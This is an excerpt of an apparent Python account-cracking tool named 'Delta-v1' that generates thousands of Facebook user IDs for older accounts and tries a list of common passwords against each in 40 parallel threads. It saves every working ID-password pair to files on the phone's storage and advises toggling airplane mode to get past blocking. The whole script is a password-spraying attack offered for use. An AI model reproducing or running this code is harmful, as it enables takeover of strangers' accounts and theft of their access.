...
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
s=f"{green}[Delta-v1-OK]"
r=f"{green}[Delta-v1✓-OK]"
...
for agenku in range(10000):
  ...
  ugen.append(uakuh)
#----------------------------[LOGO]-----------------------------------#
logo =f"""\033[1;35m________         .__   __                          ____  
\______ \   ____ |  |_/  |______            ___  _/_   | 
 |    |  \_/ __ \|  |\   __\__  \    ______ \  \/ /|   | 
 |    `   \  ___/|  |_|  |  / __ \_ /_____/  \   / |   | 
/_______  /\___  >____/__| (____  /           \_/  |___| 
        \/     \/               \/                       
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {faltu}{rad}§§{pvt}{green} {green}DEVELOPER  {white}▶︎ {green}V-Virux
 {faltu}{rad}§§{pvt} {green}TOOLTYPE   {white}▶︎ {faltu}{rad}Delta-v1{pvt}{green}
 {faltu}{rad}§§{pvt} {green}USE {faltu}{rad}DATA/DATA+VPN    {green}▶︎ {faltu}{rad}USE WIFI/WIFI+VPN{pvt}{green}
 {faltu}{rad}§§{pvt} {green}GITHUB     {white}▶︎ {rad}({white}Delta-Virux{rad})
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    os.system("clear")
    print(logo)
    print(f' {faltu}{rad}§§{pvt}{green}EXAMPLE {white}  ▶︎ {green}10000 - 20000 - 30000')
    lin()
    limit=input(f" {faltu}{rad}§§{pvt}{green}ENTER LIMITS    {white}▶︎ {green}")
    lin()
    os.system
    {'xdg-open https://www.facebook.com/arafatmahin310'} 
    os.system('clear')
    print(logo)
    print(f" {faltu}{rad}1{pvt} {green}EXAMPLE {white}  ▶︎ {green} METHOD-1 (2007-2014)")
    lin()
    ...
    with ThreadPool(max_workers=40) as sami:
        ...
        print(f' {faltu}{rad}∏{pvt} {green}IF NO  RESULT AFTER 5 MINUTES ON/OF ✈️ MODE[{white}On{orange}/{white}Off{green}] AIRPLANE MODE')
        lin()
        for mal in user:
            uid=star+mal
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","143143","1234567890","qwerty"]:
            ...
            if "session_key" in rp:
                ...
                open("/sdcard/Delta-v1-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{ok} \x1b[38;5;46m{uid} | {pw}")
                open("/sdcard/Delta-v1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{ok} \x1b[38;5;46m{uid} | {pw}")
                open("/sdcard/Delta-v1XD-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
